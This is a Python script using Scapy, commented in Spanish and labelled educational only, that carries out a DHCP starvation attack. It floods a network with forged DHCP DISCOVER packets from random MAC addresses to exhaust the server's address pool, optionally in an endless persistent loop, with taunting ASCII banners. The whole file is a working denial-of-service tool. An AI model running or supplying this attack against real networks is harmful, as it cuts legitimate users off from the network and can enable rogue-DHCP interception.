### SOLO PARA PROPOSITOS EDUCATIVOS.

#!/usr/bin/env python3

from scapy.all import *
import random
import sys
import argparse
import time
import os

def generate_random_mac():
    """Genera una dirección MAC aleatoria"""
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def send_dhcp_discover(interface, mac, victim_num):
    """Envía un paquete DHCP DISCOVER"""
    xid = random.randint(1, 0xFFFFFFFF)
    
    # Crear paquete DHCP DISCOVER
    ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(chaddr=mac2str(mac), xid=xid, flags=0x8000)
    dhcp = DHCP(options=[
        ("message-type", "discover"),
        ("hostname", f"pwned-{victim_num}"),
        ("param_req_list", [1, 3, 6, 15, 28, 51, 58, 59]),
        "end"
    ])
    
    packet = ether / ip / udp / bootp / dhcp
    sendp(packet, iface=interface, verbose=0)

def dhcp_starvation_aggressive(interface, num_requests):
    """Ataque agresivo - envía todo de golpe SIN DELAY"""
    print("[*] Modo AGRESIVO - Enviando todo sin delay...")
    
    successful_requests = 0
    mac_list = []
    
    try:
        # Generar todas las MACs primero
        for i in range(num_requests):
            mac_list.append(generate_random_mac())
        
        # Enviar TODO de golpe
        for i, mac in enumerate(mac_list):
            send_dhcp_discover(interface, mac, i)
            successful_requests += 1
            
            # Mostrar progreso cada 10 paquetes
            if (i + 1) % 10 == 0:
                print(f"[{i+1}/{num_requests}] Paquetes enviados")
            
    except KeyboardInterrupt:
        print("\n[!] Ataque interrumpido")
    except Exception as e:
        print(f"[!] Error: {str(e)}")
    
    print(f"\n[*] Total enviado: {successful_requests}/{num_requests}")
    return mac_list

def dhcp_starvation_persistent(interface, initial_macs):
    """Modo persistente - mantiene presión constante"""
    print("\n[*] Modo PERSISTENTE - Manteniendo presión sobre el servidor...")
    print("[*] Presiona Ctrl+C para detener\n")
    
    round_num = 1
    
    try:
        while True:
            print(f"\n=== RONDA {round_num} ===")
            
            # Re-enviar con las MACs existentes
            for i, mac in enumerate(initial_macs):
                send_dhcp_discover(interface, mac, i)
                
                if (i + 1) % 50 == 0:
                    print(f"[{i+1}/{len(initial_macs)}] Re-enviados")
            
            print(f"[*] Ronda {round_num} completada - {len(initial_macs)} paquetes")
            round_num += 1
            
            # Pequeña pausa entre rondas (opcional, puedes quitarla)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print(f"\n[!] Modo persistente detenido después de {round_num-1} rondas")

def main():
    parser = argparse.ArgumentParser(description='DHCP Starvation Attack')
    parser.add_argument('-i', '--interface', required=True, help='Interfaz de red (ej: eth0)')
    parser.add_argument('-n', '--number', type=int, default=300, 
                        help='Número de paquetes (default: 300 - sobrepasa /24)')
    parser.add_argument('-p', '--persistent', action='store_true',
                        help='Modo persistente - mantiene el ataque activo')
    args = parser.parse_args()
    
    # Verificar root
    if os.geteuid() != 0:
        print("[!] Ejecuta con: sudo python3 dhcp_starvation.py")
        sys.exit(1)
    
    # LEEROY JENKINS!!!
    print("\n")
    print("    ██╗     ███████╗███████╗██████╗  ██████╗  ██████╗ ██╗   ██╗")
    print("    ██║     ██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗╚██╗ ██╔╝")
    print("    ██║     █████╗  █████╗  ██████╔╝██║   ██║██║   ██║ ╚████╔╝ ")
    print("    ██║     ██╔══╝  ██╔══╝  ██╔══██╗██║   ██║██║   ██║  ╚██╔╝  ")
    print("    ███████╗███████╗███████╗██║  ██║╚██████╔╝╚██████╔╝   ██║   ")
    print("    ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ")
    print("")
    print("         ██╗███████╗███╗   ██╗██╗  ██╗██╗███╗   ██╗███████╗")
    print("         ██║██╔════╝████╗  ██║██║ ██╔╝██║████╗  ██║██╔════╝")
    print("         ██║█████╗  ██╔██╗ ██║█████╔╝ ██║██╔██╗ ██║███████╗")
    print("    ██   ██║██╔══╝  ██║╚██╗██║██╔═██╗ ██║██║╚██╗██║╚════██║")
    print("    ╚█████╔╝███████╗██║ ╚████║██║  ██╗██║██║ ╚████║███████║")
    print("     ╚════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝")
    print("")
    print("                    ██╗██╗ ██╗ ██╗")
    print("                    ╚═╝╚═╝ ╚═╝ ╚═╝")
    print("")
    time.sleep(1)
    
    print(f"[*] Interfaz: {args.interface}")
    print(f"[*] Paquetes: {args.number}")
    print(f"[*] Modo: {'PERSISTENTE (loop infinito)' if args.persistent else 'AGRESIVO (una pasada)'}")
    print("-" * 60)
    
    # Realizar ataque inicial agresivo
    mac_list = dhcp_starvation_aggressive(args.interface, args.number)
    
    # Si se activa modo persistente, continuar
    if args.persistent:
        dhcp_starvation_persistent(args.interface, mac_list)
    
    # GG EASY GIT GUD
    print("\n")
    print("    ═════════════════════════════════════════════════════")
    print("    ██████╗  ██████╗     ███████╗ █████╗ ███████╗██╗   ██╗")
    print("   ██╔════╝ ██╔════╝     ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝")
    print("   ██║  ███╗██║  ███╗    █████╗  ███████║███████╗ ╚████╔╝ ")
    print("   ██║   ██║██║   ██║    ██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ")
    print("   ╚██████╔╝╚██████╔╝    ███████╗██║  ██║███████║   ██║   ")
    print("    ╚═════╝  ╚═════╝     ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ")
    print("")
    print("        ██████╗ ██╗████████╗     ██████╗ ██╗   ██╗██████╗ ")
    print("       ██╔════╝ ██║╚══██╔══╝    ██╔════╝ ██║   ██║██╔══██╗")
    print("       ██║  ███╗██║   ██║       ██║  ███╗██║   ██║██║  ██║")
    print("       ██║   ██║██║   ██║       ██║   ██║██║   ██║██║  ██║")
    print("       ╚██████╔╝██║   ██║       ╚██████╔╝╚██████╔╝██████╔╝")
    print("        ╚═════╝ ╚═╝   ╚═╝        ╚═════╝  ╚═════╝ ╚═════╝ ")
    print("    ═════════════════════════════════════════════════════")
    print("\n")

if __name__ == "__main__":
    main()
